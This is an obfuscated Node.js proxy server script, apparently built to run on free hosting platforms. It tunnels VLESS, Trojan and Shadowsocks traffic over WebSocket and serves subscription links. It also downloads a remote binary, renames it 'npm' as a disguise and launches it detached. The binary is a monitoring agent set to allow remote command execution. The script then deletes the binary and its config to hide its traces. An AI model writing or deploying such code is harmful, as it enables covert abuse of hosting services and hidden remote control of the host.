const _0x1c2155=_0x2383;function _0x2383(_0xfcf5b,_0x1610a7){_0xfcf5b=_0xfcf5b-0x97;const _0x23b9cf=_0x23b9();let _0x238310=_0x23b9cf[_0xfcf5b];return _0x238310;}(function(_0x383952,_0x57d119){const _0xb3d1f8=_0x2383,_0x29054d=_0x383952();while(!![]){try{const _0x16cdb4=parseInt(_0xb3d1f8(0x124))/0x1+parseInt(_0xb3d1f8(0xb8))/0x2+-parseInt(_0xb3d1f8(0xe8))/0x3*(-parseInt(_0xb3d1f8(0xd1))/0x4)+-parseInt(_0xb3d1f8(0x114))/0x5*(-parseInt(_0xb3d1f8(0x100))/0x6)+-parseInt(_0xb3d1f8(0xa6))/0x7*(parseInt(_0xb3d1f8(0xd9))/0x8)+parseInt(_0xb3d1f8(0xc7))/0x9*(-parseInt(_0xb3d1f8(0xcf))/0xa)+-parseInt(_0xb3d1f8(0xda))/0xb*(parseInt(_0xb3d1f8(0x107))/0xc);if(_0x16cdb4===_0x57d119)break;else _0x29054d['push'](_0x29054d['shift']());}catch(_0x1c7e8b){_0x29054d['push'](_0x29054d['shift']());}}}(_0x23b9,0x3ffd1));const os=require('os'),http=require(_0x1c2155(0x98)),fs=require('fs'),axios=require(_0x1c2155(0xf6)),net=require(_0x1c2155(0xb4)),path=require(_0x1c2155(0xfc)),crypto=require(_0x1c2155(0xb1)),{Buffer}=require(_0x1c2155(0xcb)),{exec,execSync}=require(_0x1c2155(0xdd)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1c2155(0xe4)][_0x1c2155(0x109)]||'a5d1d7ea-9119-4c62-8f10-5e318b80a154',NEZHA_SERVER=process[_0x1c2155(0xe4)][_0x1c2155(0xeb)]||'',NEZHA_PORT=process['env'][_0x1c2155(0xdc)]||'',NEZHA_KEY=process[_0x1c2155(0xe4)][_0x1c2155(0xec)]||'',DOMAIN=process[_0x1c2155(0xe4)][_0x1c2155(0xc1)]||_0x1c2155(0xd7),AUTO_ACCESS=process[_0x1c2155(0xe4)][_0x1c2155(0xf9)]||![],WSPATH=process[_0x1c2155(0xe4)][_0x1c2155(0xc8)]||UUID[_0x1c2155(0xae)](0x0,0x8),SUB_PATH=process[_0x1c2155(0xe4)]['SUB_PATH']||_0x1c2155(0xf8),NAME=process[_0x1c2155(0xe4)]['NAME']||'',PORT=process['env'][_0x1c2155(0xf2)]||0xbb8;let uuid=UUID[_0x1c2155(0xa1)](/-/g,''),CurrentDomain=DOMAIN,Tls=_0x1c2155(0xe3),CurrentPort=0x1bb,ISP='';const DNS_SERVERS=[_0x1c2155(0x9c),_0x1c2155(0xf0)],BLOCKED_DOMAINS=['speedtest.net',_0x1c2155(0x108),_0x1c2155(0xb0),_0x1c2155(0xf3),_0x1c2155(0xe0),'testmy.net','bandwidth.place',_0x1c2155(0x126),'librespeed.org',_0x1c2155(0xfa)];function isBlockedDomain(_0x9ba650){const _0x56eb1f=_0x1c2155;if(!_0x9ba650)return![];const _0x3a840b=_0x9ba650[_0x56eb1f(0xb2)]();return BLOCKED_DOMAINS[_0x56eb1f(0xf4)](_0x56da93=>{const _0x37b96a=_0x56eb1f;return _0x3a840b===_0x56da93||_0x3a840b[_0x37b96a(0xc3)]('.'+_0x56da93);});}async function getisp(){const _0x3ebaf0=_0x1c2155;try{const _0x4aeea4=await axios['get'](_0x3ebaf0(0xde),{'headers':{'User-Agent':_0x3ebaf0(0x115),'timeout':0xbb8}}),_0x4ecf7d=_0x4aeea4[_0x3ebaf0(0x111)];ISP=(_0x4ecf7d[_0x3ebaf0(0xac)]+'-'+_0x4ecf7d[_0x3ebaf0(0x11d)])[_0x3ebaf0(0xa1)](/ /g,'_');}catch(_0x182820){try{const _0xed4068=await axios['get'](_0x3ebaf0(0xff),{'headers':{'User-Agent':_0x3ebaf0(0x115),'timeout':0xbb8}}),_0x5dc4bb=_0xed4068[_0x3ebaf0(0x111)];ISP=(_0x5dc4bb[_0x3ebaf0(0xe2)]+'-'+_0x5dc4bb[_0x3ebaf0(0x12b)])[_0x3ebaf0(0xa1)](/ /g,'_');}catch(_0x13351a){ISP=_0x3ebaf0(0xc6);}}}async function getip(){const _0x5b5d33=_0x1c2155;if(!DOMAIN||DOMAIN===_0x5b5d33(0xd7))try{const _0x36dd98=await axios['get'](_0x5b5d33(0xe7),{'timeout':0x1388}),_0x2ec7cb=_0x36dd98[_0x5b5d33(0x111)]['trim']();CurrentDomain=_0x2ec7cb,Tls=_0x5b5d33(0x103),CurrentPort=PORT;}catch(_0x544e59){console[_0x5b5d33(0x118)](_0x5b5d33(0xd0),_0x544e59[_0x5b5d33(0xa9)]),(CurrentDomain=_0x5b5d33(0xa4),Tls='tls',CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x5b5d33(0xe3),CurrentPort=0x1bb;}const httpServer=http['createServer'](async(_0x54e4f3,_0x137d06)=>{const _0x43fb5a=_0x1c2155;if(_0x54e4f3[_0x43fb5a(0x102)]==='/'){const _0x26df14=path[_0x43fb5a(0xe5)](__dirname,'index.html');fs['readFile'](_0x26df14,'utf8',(_0x2550b3,_0x2922d9)=>{const _0x4e1006=_0x43fb5a;if(_0x2550b3){_0x137d06[_0x4e1006(0xed)](0xc8,{'Content-Type':'text/html'}),_0x137d06['end'](_0x4e1006(0xce));return;}_0x137d06['writeHead'](0xc8,{'Content-Type':_0x4e1006(0x125)}),_0x137d06[_0x4e1006(0x11f)](_0x2922d9);});return;}else{if(_0x54e4f3[_0x43fb5a(0x102)]==='/'+SUB_PATH){await getisp(),await getip();const _0x4d94e2=NAME?NAME+'-'+ISP:ISP,_0x459e2e=Tls===_0x43fb5a(0xe3)?_0x43fb5a(0xe3):'none',_0x34e472=Tls===_0x43fb5a(0xe3)?'tls;':'',_0x206954=_0x43fb5a(0xba)+UUID+'@'+CurrentDomain+':'+CurrentPort+'?encryption=none&security='+_0x459e2e+_0x43fb5a(0x11b)+CurrentDomain+_0x43fb5a(0xd2)+CurrentDomain+_0x43fb5a(0x121)+WSPATH+'#'+_0x4d94e2,_0x4908bf='trojan://'+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x43fb5a(0xea)+_0x459e2e+'&sni='+CurrentDomain+_0x43fb5a(0xd2)+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x4d94e2,_0x15e8ef=Buffer[_0x43fb5a(0xd8)](_0x43fb5a(0xaf)+UUID)[_0x43fb5a(0x104)](_0x43fb5a(0x11c)),_0x5c9de4=_0x43fb5a(0x99)+_0x15e8ef+'@'+CurrentDomain+':'+CurrentPort+_0x43fb5a(0xbe)+CurrentDomain+_0x43fb5a(0x12a)+WSPATH+';'+_0x34e472+_0x43fb5a(0x10e)+CurrentDomain+_0x43fb5a(0x101)+_0x4d94e2,_0x36c8f5=_0x206954+'\x0a'+_0x4908bf+'\x0a'+_0x5c9de4,_0x18e40=Buffer[_0x43fb5a(0xd8)](_0x36c8f5)[_0x43fb5a(0x104)](_0x43fb5a(0x11c));_0x137d06[_0x43fb5a(0xed)](0xc8,{'Content-Type':_0x43fb5a(0x112)}),_0x137d06[_0x43fb5a(0x11f)](_0x18e40+'\x0a');}else _0x137d06[_0x43fb5a(0xed)](0x194,{'Content-Type':_0x43fb5a(0x112)}),_0x137d06['end'](_0x43fb5a(0x9d));}});function resolveHost(_0x56c5e2){return new Promise((_0x665b8f,_0x46ab6a)=>{const _0x42dff7=_0x2383;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x42dff7(0xf5)](_0x56c5e2)){_0x665b8f(_0x56c5e2);return;}let _0x71f44=0x0;function _0x176528(){const _0xd73cf6=_0x42dff7;if(_0x71f44>=DNS_SERVERS['length']){_0x46ab6a(new Error(_0xd73cf6(0xe9)+_0x56c5e2+_0xd73cf6(0x9f)));return;}const _0x3d5482=DNS_SERVERS[_0x71f44];_0x71f44++;const _0x519a45=_0xd73cf6(0xfb)+encodeURIComponent(_0x56c5e2)+'&type=A';axios['get'](_0x519a45,{'timeout':0x1388,'headers':{'Accept':_0xd73cf6(0xb9)}})[_0xd73cf6(0xfd)](_0x22f5fe=>{const _0x40bb89=_0xd73cf6,_0x479b31=_0x22f5fe[_0x40bb89(0x111)];if(_0x479b31[_0x40bb89(0x110)]===0x0&&_0x479b31[_0x40bb89(0xfe)]&&_0x479b31[_0x40bb89(0xfe)]['length']>0x0){const _0x5681e6=_0x479b31[_0x40bb89(0xfe)][_0x40bb89(0xb7)](_0x435da0=>_0x435da0[_0x40bb89(0x123)]===0x1);if(_0x5681e6){_0x665b8f(_0x5681e6[_0x40bb89(0x111)]);return;}}_0x176528();})['catch'](_0x412627=>{_0x176528();});}_0x176528();});}function handleVlsConnection(_0x187ced,_0x69314b){const _0x2877bc=_0x1c2155,[_0xd81b25]=_0x69314b,_0x366d38=_0x69314b['slice'](0x1,0x11);if(!_0x366d38['every']((_0x3bd334,_0x24a64b)=>_0x3bd334==parseInt(uuid['substr'](_0x24a64b*0x2,0x2),0x10)))return![];let _0x4c29e6=_0x69314b[_0x2877bc(0xae)](0x11,0x12)[_0x2877bc(0xd5)]()+0x13;const _0x1d8b3f=_0x69314b[_0x2877bc(0xae)](_0x4c29e6,_0x4c29e6+=0x2)[_0x2877bc(0xa5)](0x0),_0x5db34a=_0x69314b[_0x2877bc(0xae)](_0x4c29e6,_0x4c29e6+=0x1)[_0x2877bc(0xd5)](),_0x1065bc=_0x5db34a==0x1?_0x69314b[_0x2877bc(0xae)](_0x4c29e6,_0x4c29e6+=0x4)[_0x2877bc(0xe5)]('.'):_0x5db34a==0x2?new TextDecoder()[_0x2877bc(0xef)](_0x69314b['slice'](_0x4c29e6+0x1,_0x4c29e6+=0x1+_0x69314b[_0x2877bc(0xae)](_0x4c29e6,_0x4c29e6+0x1)[_0x2877bc(0xd5)]())):_0x5db34a==0x3?_0x69314b[_0x2877bc(0xae)](_0x4c29e6,_0x4c29e6+=0x10)[_0x2877bc(0x117)]((_0x5ea640,_0x44709d,_0xbdfccb,_0x536b26)=>_0xbdfccb%0x2?_0x5ea640[_0x2877bc(0x116)](_0x536b26[_0x2877bc(0xae)](_0xbdfccb-0x1,_0xbdfccb+0x1)):_0x5ea640,[])[_0x2877bc(0xcc)](_0x278790=>_0x278790[_0x2877bc(0xa5)](0x0)[_0x2877bc(0x104)](0x10))[_0x2877bc(0xe5)](':'):'';if(isBlockedDomain(_0x1065bc))return _0x187ced[_0x2877bc(0x120)](),![];_0x187ced['send'](new Uint8Array([_0xd81b25,0x0]));const _0xbf209f=createWebSocketStream(_0x187ced);return resolveHost(_0x1065bc)[_0x2877bc(0xfd)](_0x5f29a5=>{const _0x350aac=_0x2877bc;net[_0x350aac(0xd3)]({'host':_0x5f29a5,'port':_0x1d8b3f},function(){const _0x4674e3=_0x350aac;this[_0x4674e3(0x10d)](_0x69314b[_0x4674e3(0xae)](_0x4c29e6)),_0xbf209f['on'](_0x4674e3(0x118),()=>{})[_0x4674e3(0x127)](this)['on'](_0x4674e3(0x118),()=>{})[_0x4674e3(0x127)](_0xbf209f);})['on'](_0x350aac(0x118),()=>{});})[_0x2877bc(0xcd)](_0x104a12=>{const _0x451431=_0x2877bc;net[_0x451431(0xd3)]({'host':_0x1065bc,'port':_0x1d8b3f},function(){const _0x422d7f=_0x451431;this[_0x422d7f(0x10d)](_0x69314b[_0x422d7f(0xae)](_0x4c29e6)),_0xbf209f['on']('error',()=>{})[_0x422d7f(0x127)](this)['on'](_0x422d7f(0x118),()=>{})[_0x422d7f(0x127)](_0xbf209f);})['on'](_0x451431(0x118),()=>{});}),!![];}function _0x23b9(){const _0x237bdd=['connection','buffer','map','catch','Hello\x20world!','10mEpZmq','Failed\x20to\x20get\x20IP','8WpMBKT','&fp=chrome&type=ws&host=','connect','config.yaml','readUInt8','arm64','your-domain.com','from','8FrJFHu','87406bpjETx','includes','NEZHA_PORT','child_process','https://api.ip.sb/geoip','stream','speedof.me','every','countryCode','tls','env','join','digest','https://api-ipv4.ip.sb/ip','179523MlvHBM','Failed\x20to\x20resolve\x20','?security=','NEZHA_SERVER','NEZHA_KEY','writeHead','Server','decode','1.1.1.1','log','PORT','speed.cloudflare.com','some','test','axios','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','sub','AUTO_ACCESS','speedcheck.org','https://dns.google/resolve?name=','path','then','Answer','http://ip-api.com/json','2718akxaBW',';skip-cert-verify%3Dtrue;mux%3D0#','url','none','toString','2083','npm\x20running\x20error:','36Dfesjd','fast.com','UUID','pop','2096','npm\x20is\x20already\x20running,\x20skip\x20running...','write','sni%3D','true','Status','data','text/plain','forEach','95ZNEmBO','Mozilla/5.0','concat','reduce','error','Automatic\x20Access\x20Task\x20added\x20successfully','arm','&sni=','base64','isp','post','end','close','&path=%2F','https://','type','433513VhvprY','text/html','speed.io','pipe','get','arch',';path%3D%2F','org','split','http','ss://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20-p\x20','8.8.4.4','Not\x20Found\x0a','/bin/bash','\x20with\x20all\x20DNS\x20servers','443','replace','utf-8','2087','cahnge-your-domain.com','readUInt16BE','2725065cBCzuJ','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','trim','message','error:\x20','setsid\x20nohup\x20./npm\x20-s\x20','country_code','hex','slice','none:','speedtest.cn','crypto','toLowerCase','2053','net','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/agent','find','588492GAxrzm','application/dns-json','vless://','npm\x20is\x20running','--tls','listen','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','finish','npm','DOMAIN','length','endsWith','chmod\x20+x\x20npm','Server\x20is\x20running\x20on\x20port\x20','Unknown','1627362vSorVW','WSPATH','https://amd64.ssss.nyc.mn/v1'];_0x23b9=function(){return _0x237bdd;};return _0x23b9();}function handleTrojConnection(_0x33219c,_0x1fa337){const _0x373198=_0x1c2155;try{if(_0x1fa337[_0x373198(0xc2)]<0x3a)return![];const _0x1bb21a=_0x1fa337[_0x373198(0xae)](0x0,0x38)[_0x373198(0x104)](),_0x3f1864=[UUID];let _0x27c3e6=null;for(const _0xd3b8ba of _0x3f1864){const _0xafd496=crypto['createHash']('sha224')['update'](_0xd3b8ba)[_0x373198(0xe6)](_0x373198(0xad));if(_0xafd496===_0x1bb21a){_0x27c3e6=_0xd3b8ba;break;}}if(!_0x27c3e6)return![];let _0x55e033=0x38;_0x1fa337[_0x55e033]===0xd&&_0x1fa337[_0x55e033+0x1]===0xa&&(_0x55e033+=0x2);const _0x1ee27d=_0x1fa337[_0x55e033];if(_0x1ee27d!==0x1)return![];_0x55e033+=0x1;const _0x3aeea2=_0x1fa337[_0x55e033];_0x55e033+=0x1;let _0xca6119,_0x114bfd;if(_0x3aeea2===0x1)_0xca6119=_0x1fa337[_0x373198(0xae)](_0x55e033,_0x55e033+0x4)[_0x373198(0xe5)]('.'),_0x55e033+=0x4;else{if(_0x3aeea2===0x3){const _0x1ebad9=_0x1fa337[_0x55e033];_0x55e033+=0x1,_0xca6119=_0x1fa337[_0x373198(0xae)](_0x55e033,_0x55e033+_0x1ebad9)[_0x373198(0x104)](),_0x55e033+=_0x1ebad9;}else{if(_0x3aeea2===0x4)_0xca6119=_0x1fa337['slice'](_0x55e033,_0x55e033+0x10)[_0x373198(0x117)]((_0x20ef5d,_0x145431,_0x4dcdfc,_0x16a853)=>_0x4dcdfc%0x2?_0x20ef5d[_0x373198(0x116)](_0x16a853[_0x373198(0xae)](_0x4dcdfc-0x1,_0x4dcdfc+0x1)):_0x20ef5d,[])[_0x373198(0xcc)](_0x4d3444=>_0x4d3444[_0x373198(0xa5)](0x0)['toString'](0x10))[_0x373198(0xe5)](':'),_0x55e033+=0x10;else return![];}}_0x114bfd=_0x1fa337[_0x373198(0xa5)](_0x55e033),_0x55e033+=0x2;_0x55e033<_0x1fa337[_0x373198(0xc2)]&&_0x1fa337[_0x55e033]===0xd&&_0x1fa337[_0x55e033+0x1]===0xa&&(_0x55e033+=0x2);if(isBlockedDomain(_0xca6119))return _0x33219c[_0x373198(0x120)](),![];const _0xb463bb=createWebSocketStream(_0x33219c);return resolveHost(_0xca6119)['then'](_0x3eaca8=>{const _0x4737ca=_0x373198;net[_0x4737ca(0xd3)]({'host':_0x3eaca8,'port':_0x114bfd},function(){const _0x10aeb3=_0x4737ca;_0x55e033<_0x1fa337[_0x10aeb3(0xc2)]&&this[_0x10aeb3(0x10d)](_0x1fa337['slice'](_0x55e033)),_0xb463bb['on'](_0x10aeb3(0x118),()=>{})[_0x10aeb3(0x127)](this)['on'](_0x10aeb3(0x118),()=>{})[_0x10aeb3(0x127)](_0xb463bb);})['on'](_0x4737ca(0x118),()=>{});})[_0x373198(0xcd)](_0x5afe0c=>{const _0x37b4ed=_0x373198;net['connect']({'host':_0xca6119,'port':_0x114bfd},function(){const _0x4e2a27=_0x2383;_0x55e033<_0x1fa337[_0x4e2a27(0xc2)]&&this[_0x4e2a27(0x10d)](_0x1fa337['slice'](_0x55e033)),_0xb463bb['on'](_0x4e2a27(0x118),()=>{})[_0x4e2a27(0x127)](this)['on']('error',()=>{})[_0x4e2a27(0x127)](_0xb463bb);})['on'](_0x37b4ed(0x118),()=>{});}),!![];}catch(_0x112301){return![];}}function handleSsConnection(_0x4bd7ab,_0x1b7765){const _0x533f1c=_0x1c2155;try{let _0x7bbe2b=0x0;const _0x3c21f5=_0x1b7765[_0x7bbe2b];_0x7bbe2b+=0x1;let _0x5e2bb0,_0x5e3cf5;if(_0x3c21f5===0x1)_0x5e2bb0=_0x1b7765[_0x533f1c(0xae)](_0x7bbe2b,_0x7bbe2b+0x4)['join']('.'),_0x7bbe2b+=0x4;else{if(_0x3c21f5===0x3){const _0x27ecdd=_0x1b7765[_0x7bbe2b];_0x7bbe2b+=0x1,_0x5e2bb0=_0x1b7765['slice'](_0x7bbe2b,_0x7bbe2b+_0x27ecdd)[_0x533f1c(0x104)](),_0x7bbe2b+=_0x27ecdd;}else{if(_0x3c21f5===0x4)_0x5e2bb0=_0x1b7765[_0x533f1c(0xae)](_0x7bbe2b,_0x7bbe2b+0x10)[_0x533f1c(0x117)]((_0xdf2168,_0x1e698a,_0x4ea4e1,_0x4c82ba)=>_0x4ea4e1%0x2?_0xdf2168['concat'](_0x4c82ba[_0x533f1c(0xae)](_0x4ea4e1-0x1,_0x4ea4e1+0x1)):_0xdf2168,[])[_0x533f1c(0xcc)](_0x2b16ba=>_0x2b16ba[_0x533f1c(0xa5)](0x0)['toString'](0x10))[_0x533f1c(0xe5)](':'),_0x7bbe2b+=0x10;else return![];}}_0x5e3cf5=_0x1b7765[_0x533f1c(0xa5)](_0x7bbe2b),_0x7bbe2b+=0x2;if(isBlockedDomain(_0x5e2bb0))return _0x4bd7ab[_0x533f1c(0x120)](),![];const _0x285ae5=createWebSocketStream(_0x4bd7ab);return resolveHost(_0x5e2bb0)[_0x533f1c(0xfd)](_0x8dda9f=>{const _0x2657c0=_0x533f1c;net[_0x2657c0(0xd3)]({'host':_0x8dda9f,'port':_0x5e3cf5},function(){const _0x14cf40=_0x2657c0;_0x7bbe2b<_0x1b7765[_0x14cf40(0xc2)]&&this[_0x14cf40(0x10d)](_0x1b7765['slice'](_0x7bbe2b)),_0x285ae5['on'](_0x14cf40(0x118),()=>{})['pipe'](this)['on'](_0x14cf40(0x118),()=>{})[_0x14cf40(0x127)](_0x285ae5);})['on'](_0x2657c0(0x118),()=>{});})['catch'](_0x28f26e=>{const _0x36c336=_0x533f1c;net[_0x36c336(0xd3)]({'host':_0x5e2bb0,'port':_0x5e3cf5},function(){const _0x4c1d5b=_0x36c336;_0x7bbe2b<_0x1b7765[_0x4c1d5b(0xc2)]&&this[_0x4c1d5b(0x10d)](_0x1b7765['slice'](_0x7bbe2b)),_0x285ae5['on']('error',()=>{})[_0x4c1d5b(0x127)](this)['on']('error',()=>{})['pipe'](_0x285ae5);})['on'](_0x36c336(0x118),()=>{});}),!![];}catch(_0x1b4e5b){return![];}}const wss=new WebSocket[(_0x1c2155(0xee))]({'server':httpServer});wss['on'](_0x1c2155(0xca),(_0x54d3fd,_0x4d46a4)=>{const _0x8f28aa=_0x1c2155,_0x35348e=_0x4d46a4[_0x8f28aa(0x102)]||'',_0x354e0b='/'+WSPATH;if(!_0x35348e['startsWith'](_0x354e0b)){_0x54d3fd[_0x8f28aa(0x120)]();return;}_0x54d3fd['once'](_0x8f28aa(0xa9),_0x3148a0=>{const _0x12229e=_0x8f28aa;if(_0x3148a0[_0x12229e(0xc2)]>0x11&&_0x3148a0[0x0]===0x0){const _0x3fe806=_0x3148a0[_0x12229e(0xae)](0x1,0x11),_0x22b1eb=_0x3fe806[_0x12229e(0xe1)]((_0x245048,_0x495157)=>_0x245048==parseInt(uuid['substr'](_0x495157*0x2,0x2),0x10));if(_0x22b1eb){!handleVlsConnection(_0x54d3fd,_0x3148a0)&&_0x54d3fd[_0x12229e(0x120)]();return;}}if(_0x3148a0['length']>=0x3a){if(handleTrojConnection(_0x54d3fd,_0x3148a0))return;}if(_0x3148a0[_0x12229e(0xc2)]>0x0&&(_0x3148a0[0x0]===0x1||_0x3148a0[0x0]===0x3||_0x3148a0[0x0]===0x4)){if(handleSsConnection(_0x54d3fd,_0x3148a0))return;}_0x54d3fd[_0x12229e(0x120)]();})['on'](_0x8f28aa(0x118),()=>{});});const getDownloadUrl=()=>{const _0x5cd560=_0x1c2155,_0x121fbe=os[_0x5cd560(0x129)]();return _0x121fbe===_0x5cd560(0x11a)||_0x121fbe===_0x5cd560(0xd6)||_0x121fbe==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x5cd560(0xc9):_0x5cd560(0xb6);},downloadFile=async()=>{const _0x113bf1=_0x1c2155;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x213984=getDownloadUrl(),_0x40ba49=await axios({'method':_0x113bf1(0x128),'url':_0x213984,'responseType':_0x113bf1(0xdf)}),_0x5649a4=fs['createWriteStream'](_0x113bf1(0xc0));return _0x40ba49[_0x113bf1(0x111)]['pipe'](_0x5649a4),new Promise((_0x562b79,_0x1ed09d)=>{const _0x1a605b=_0x113bf1;_0x5649a4['on'](_0x1a605b(0xbf),()=>{const _0xa26c3c=_0x1a605b;console[_0xa26c3c(0xf1)]('npm\x20download\x20successfully'),exec(_0xa26c3c(0xc4),_0x200216=>{if(_0x200216)_0x1ed09d(_0x200216);_0x562b79();});}),_0x5649a4['on'](_0x1a605b(0x118),_0x1ed09d);});}catch(_0x10fdd9){throw _0x10fdd9;}},runnz=async()=>{const _0x447898=_0x1c2155;try{const _0x15bcd6=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x447898(0xa2)});if(_0x15bcd6[_0x447898(0xa8)]()!==''){console[_0x447898(0xf1)](_0x447898(0x10c));return;}}catch(_0x3d29cc){}await downloadFile();let _0x18f791='',_0x1f00a7=[_0x447898(0xa0),'8443',_0x447898(0x10b),_0x447898(0xa3),_0x447898(0x105),_0x447898(0xb3)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x565336=_0x1f00a7[_0x447898(0xdb)](NEZHA_PORT)?_0x447898(0xbc):'';_0x18f791=_0x447898(0xab)+NEZHA_SERVER+':'+NEZHA_PORT+_0x447898(0x9b)+NEZHA_KEY+'\x20'+_0x565336+_0x447898(0xf7);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1eec79=NEZHA_SERVER[_0x447898(0xdb)](':')?NEZHA_SERVER[_0x447898(0x97)](':')[_0x447898(0x10a)]():'',_0x13ed65=_0x1f00a7[_0x447898(0xdb)](_0x1eec79)?_0x447898(0x10f):'false',_0x43cf63='client_secret:\x20'+NEZHA_KEY+_0x447898(0xa7)+NEZHA_SERVER+_0x447898(0x9a)+_0x13ed65+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x447898(0xd4),_0x43cf63);}_0x18f791=_0x447898(0xb5);}else return;}try{exec(_0x18f791,{'shell':_0x447898(0x9e)},_0x2965c0=>{const _0x5b4a57=_0x447898;if(_0x2965c0)console[_0x5b4a57(0x118)](_0x5b4a57(0x106),_0x2965c0);else console[_0x5b4a57(0xf1)](_0x5b4a57(0xbb));});}catch(_0x40de72){console[_0x447898(0x118)](_0x447898(0xaa)+_0x40de72);}};async function addAccessTask(){const _0x2d8019=_0x1c2155;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x394dc2=_0x2d8019(0x122)+DOMAIN+'/'+SUB_PATH;try{const _0x459662=await axios[_0x2d8019(0x11e)]('https://oooo.serv00.net/add-url',{'url':_0x394dc2},{'headers':{'Content-Type':'application/json'}});console[_0x2d8019(0xf1)](_0x2d8019(0x119));}catch(_0x1266af){}}const delFiles=()=>{const _0x524bbd=_0x1c2155;[_0x524bbd(0xc0),_0x524bbd(0xd4)][_0x524bbd(0x113)](_0x2153f0=>fs['unlink'](_0x2153f0,()=>{}));};httpServer[_0x1c2155(0xbd)](PORT,()=>{const _0x200b0c=_0x1c2155;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x200b0c(0xf1)](_0x200b0c(0xc5)+PORT);});
